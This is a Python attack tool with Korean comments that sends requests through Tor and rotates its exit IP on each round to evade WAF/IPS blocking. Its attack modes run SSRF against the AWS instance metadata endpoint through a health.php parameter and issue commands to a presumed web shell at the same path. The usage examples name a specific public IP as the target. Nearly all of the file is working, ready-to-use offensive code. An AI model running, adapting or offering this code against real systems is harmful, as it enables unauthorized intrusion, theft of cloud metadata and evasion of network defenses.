#!/usr/bin/env python3
"""
Tor IP Rotation Attack
- Tor를 통해 IP를 계속 변경하며 공격
- WAF/IPS IP 차단 우회
- 각 요청마다 새로운 Tor identity 사용
"""

import requests
import time
import sys
from stem import Signal
from stem.control import Controller
import socks
import socket

class TorRotationAttack:
    def __init__(self, target_url, tor_port=9050, control_port=9051):
        self.target_url = target_url
        self.tor_port = tor_port
        self.control_port = control_port
        self.session = requests.Session()

        # Tor SOCKS5 프록시 설정
        self.session.proxies = {
            'http': f'socks5h://127.0.0.1:{tor_port}',
            'https': f'socks5h://127.0.0.1:{tor_port}'
        }

        print("╔════════════════════════════════════════════════════════════╗")
        print("║   Tor IP Rotation Attack - WAF/IPS 우회                   ║")
        print("╚════════════════════════════════════════════════════════════╝")
        print()

    def renew_tor_identity(self):
        """Tor identity 갱신 (새로운 IP)"""
        try:
            with Controller.from_port(port=self.control_port) as controller:
                controller.authenticate()
                controller.signal(Signal.NEWNYM)
                time.sleep(3)  # Tor circuit 재구성 대기
            return True
        except Exception as e:
            print(f"[-] Tor identity 갱신 실패: {e}")
            return False

    def get_current_ip(self):
        """현재 Tor exit node IP 확인"""
        try:
            resp = self.session.get('http://httpbin.org/ip', timeout=10)
            return resp.json().get('origin', 'Unknown')
        except:
            try:
                resp = self.session.get('http://icanhazip.com', timeout=10)
                return resp.text.strip()
            except:
                return 'Unknown'

    def test_target_connection(self):
        """대상 서버 연결 테스트"""
        print("[*] 대상 서버 연결 테스트 중...")
        try:
            resp = self.session.get(self.target_url, timeout=15)
            print(f"[+] 연결 성공! HTTP {resp.status_code}")
            return True
        except Exception as e:
            print(f"[-] 연결 실패: {e}")
            return False

    def ssrf_attack(self, ssrf_url):
        """SSRF 공격 (IMDSv1)"""
        try:
            health_endpoint = f"{self.target_url}/api/health.php"
            params = {
                'check': 'metadata',
                'url': ssrf_url
            }
            resp = self.session.get(health_endpoint, params=params, timeout=15)
            return resp.text
        except Exception as e:
            return f"Error: {e}"

    def webshell_command(self, cmd):
        """웹쉘 명령 실행"""
        try:
            webshell_url = f"{self.target_url}/api/health.php"
            params = {'cmd': cmd}
            resp = self.session.get(webshell_url, params=params, timeout=30)
            return resp.text
        except Exception as e:
            return f"Error: {e}"

    def rotating_attack(self, attack_type='recon', count=10):
        """IP를 변경하며 반복 공격"""
        print(f"\n[*] IP 순환 공격 시작: {attack_type}")
        print(f"[*] 공격 횟수: {count}")
        print("=" * 60)

        success_count = 0

        for i in range(count):
            print(f"\n[{i+1}/{count}] 공격 라운드")

            # Tor IP 변경
            if i > 0:  # 첫 요청은 현재 IP 사용
                print("[*] Tor identity 갱신 중...")
                if not self.renew_tor_identity():
                    print("[-] IP 변경 실패, 계속 진행...")

            # 현재 IP 확인
            current_ip = self.get_current_ip()
            print(f"[*] 현재 Tor Exit IP: {current_ip}")

            # 공격 수행
            if attack_type == 'recon':
                # 정찰 - 페이지 접근
                try:
                    resp = self.session.get(self.target_url, timeout=15)
                    print(f"[+] 페이지 접근 성공! HTTP {resp.status_code}")
                    success_count += 1
                except Exception as e:
                    print(f"[-] 실패: {e}")

            elif attack_type == 'ssrf':
                # SSRF 공격
                result = self.ssrf_attack('http://169.254.169.254/latest/meta-data/instance-id')
                if 'i-' in result:
                    print(f"[+] SSRF 성공! Instance ID: {result[:20]}...")
                    success_count += 1
                else:
                    print(f"[-] SSRF 실패")

            elif attack_type == 'webshell':
                # 웹쉘 명령
                result = self.webshell_command('whoami')
                if 'root' in result or 'apache' in result or 'ec2-user' in result:
                    print(f"[+] 웹쉘 성공! User: {result.strip()[:50]}")
                    success_count += 1
                else:
                    print(f"[-] 웹쉘 실패")

            elif attack_type == 'full':
                # 전체 공격 체인
                print("  [1] 페이지 접근...")
                resp = self.session.get(self.target_url, timeout=15)
                print(f"      HTTP {resp.status_code}")

                print("  [2] SSRF 공격...")
                ssrf_result = self.ssrf_attack('http://169.254.169.254/latest/meta-data/instance-id')
                if 'i-' in ssrf_result:
                    print(f"      Instance: {ssrf_result[:20]}")

                print("  [3] 웹쉘 명령...")
                shell_result = self.webshell_command('hostname')
                print(f"      Hostname: {shell_result.strip()[:50]}")

                success_count += 1

            # 다음 공격 전 대기
            if i < count - 1:
                print("[*] 다음 공격 대기 중... (5초)")
                time.sleep(5)

        print("\n" + "=" * 60)
        print(f"[*] 공격 완료!")
        print(f"[+] 성공: {success_count}/{count} ({success_count/count*100:.1f}%)")
        return success_count


def check_tor_running():
    """Tor 실행 여부 확인"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = sock.connect_ex(('127.0.0.1', 9050))
        sock.close()
        return result == 0
    except:
        return False


def setup_tor():
    """Tor 설치 및 실행 가이드"""
    print("╔════════════════════════════════════════════════════════════╗")
    print("║   Tor 설치 가이드                                          ║")
    print("╚════════════════════════════════════════════════════════════╝")
    print()
    print("[!] Tor가 실행되지 않았습니다. 다음 명령어로 설치하세요:")
    print()
    print("macOS:")
    print("  brew install tor")
    print("  brew services start tor")
    print()
    print("Linux (Ubuntu/Debian):")
    print("  sudo apt update")
    print("  sudo apt install tor")
    print("  sudo systemctl start tor")
    print()
    print("Linux (CentOS/RHEL):")
    print("  sudo yum install tor")
    print("  sudo systemctl start tor")
    print()
    print("Python 패키지:")
    print("  pip3 install requests[socks] pysocks stem")
    print()
    print("Tor 설정 파일 (/etc/tor/torrc 또는 /usr/local/etc/tor/torrc):")
    print("  ControlPort 9051")
    print("  CookieAuthentication 0")
    print()


def main():
    if len(sys.argv) < 2:
        print("사용법:")
        print(f"  {sys.argv[0]} <target_url> [attack_type] [count]")
        print()
        print("예시:")
        print(f"  {sys.argv[0]} http://3.35.22.248 recon 10")
        print(f"  {sys.argv[0]} http://3.35.22.248 ssrf 20")
        print(f"  {sys.argv[0]} http://3.35.22.248 webshell 15")
        print(f"  {sys.argv[0]} http://3.35.22.248 full 5")
        print()
        print("공격 타입:")
        print("  recon    - 페이지 접근 (정찰)")
        print("  ssrf     - SSRF 공격")
        print("  webshell - 웹쉘 명령 실행")
        print("  full     - 전체 공격 체인")
        sys.exit(1)

    target_url = sys.argv[1].rstrip('/')
    attack_type = sys.argv[2] if len(sys.argv) > 2 else 'recon'
    count = int(sys.argv[3]) if len(sys.argv) > 3 else 10

    # Tor 실행 확인
    if not check_tor_running():
        setup_tor()
        sys.exit(1)

    print("[+] Tor 실행 확인됨!")
    print()

    try:
        attacker = TorRotationAttack(target_url)

        # 초기 IP 확인
        print("[*] 초기 Tor Exit IP 확인 중...")
        initial_ip = attacker.get_current_ip()
        print(f"[*] 현재 IP: {initial_ip}")
        print()

        # 대상 연결 테스트
        if not attacker.test_target_connection():
            print("[-] 대상 서버에 연결할 수 없습니다.")
            sys.exit(1)

        # 공격 시작
        attacker.rotating_attack(attack_type, count)

    except KeyboardInterrupt:
        print("\n[!] 사용자에 의해 중단됨")
        sys.exit(0)
    except Exception as e:
        print(f"\n[-] 에러 발생: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == '__main__':
    main()
